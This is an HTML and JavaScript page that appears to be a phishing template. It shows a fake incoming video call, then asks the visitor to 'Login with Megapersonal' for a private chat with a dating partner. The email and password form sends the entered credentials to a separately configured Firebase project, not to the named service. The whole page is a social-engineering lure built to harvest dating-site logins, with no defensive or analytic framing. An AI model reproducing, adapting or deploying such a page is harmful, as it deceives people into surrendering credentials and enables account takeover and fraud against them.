<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Incoming Video Call</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background-color: black; /* Fallback color */
        }
        .background-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
        }
        .container, .live-chat, .login-page {
            position: relative;
            text-align: center;
            z-index: 1;
            display: none;
        }
        .title {
            font-size: 2em;
            margin-bottom: 20px;
            color: white;
        }
        .buttons {
            display: flex;
            justify-content: center;
            gap: 20px;
        }
        .button {
            padding: 15px 30px;
            font-size: 1.2em;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
        }
        .button-green {
            background-color: #4CAF50;
        }
        .button-red {
            background-color: #f44336;
        }
        .live-chat-content, .login-content {
            color: white;
        }
        .login-button {
            display: flex;
            align-items: center;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.2em;
        }
        .login-button img {
            margin-right: 10px;
            width: 24px;
            height: 24px;
        }
        .login-form {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 5px;
            display: inline-block;
        }
        .login-form input {
            display: block;
            margin: 10px 0;
            padding: 10px;
            width: 100%;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-form button {
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
        }
    </style>
</head>
<body>
    <video id="backgroundVideo" autoplay muted playsinline class="background-video"></video>
    <div class="container" id="incomingCall">
        <div class="title">Incoming Video Call</div>
        <div class="buttons">
            <button class="button button-green" onclick="showLiveChat()">Receive</button>
            <button class="button button-red">Decline</button>
        </div>
    </div>
    <div class="live-chat" id="liveChat">
        <div class="live-chat-content">
            <div class="title">Live Video Chat</div>
            <p>Login with Megapersonal and enjoy a Private Video chat with your dating partner.</p>
            <button class="login-button" onclick="showLoginPage()">
                <img src="path-to-your-logo-image.png" alt="Logo">
                Login with Megapersonal
            </button>
        </div>
    </div>
    <div class="login-page" id="loginPage">
        <div class="login-content">
            <img src="path-to-your-site-icon.png" alt="Site Icon" style="width: 50px; height: 50px;">
            <div class="title">Login</div>
            <form class="login-form" id="loginForm">
                <input type="email" id="email" name="email" placeholder="Email" required>
                <input type="password" id="password" name="pass" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </div>

    <!-- Include Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>

    <script>
        // Firebase configuration
     const firebaseConfig = {
  apiKey: "AIzaSyABlLCj8HyPHTtQbmo83QFnsQsjk6mDeXs",
  authDomain: "info-571f9.firebaseapp.com",
  projectId: "info-571f9",
  storageBucket: "info-571f9.appspot.com",
  messagingSenderId: "998797023754",
  appId: "1:998797023754:web:c7fb3fb4ce8803b1259df3",
  measurementId: "G-TQ2B18B2SH"
};

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);

        // Get a reference to the Firebase authentication service
        const auth = firebase.auth();

        // Function to show live chat
        function showLiveChat() {
            document.getElementById('incomingCall').style.display = 'none';
            document.getElementById('liveChat').style.display = 'block';
        }

        // Function to show login page
        function showLoginPage() {
            document.getElementById('liveChat').style.display = 'none';
            document.getElementById('loginPage').style.display = 'block';
        }

        // Function to handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Get form values
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Sign in with email and password
            auth.signInWithEmailAndPassword(email, password)
                .then((userCredential) => {
                    // Signed in
                    const user = userCredential.user;
                    console.log('User signed in:', user);
                    // Redirect to a new page or perform other actions upon successful login
                })
                .catch((error) => {
                    // Handle errors
                    const errorCode = error.code;
                    const errorMessage = error.message;
                    console.error('Login error:', errorMessage);
                    // Display error message to the user or perform other actions
                });
        });
    </script>
</body>
</html>
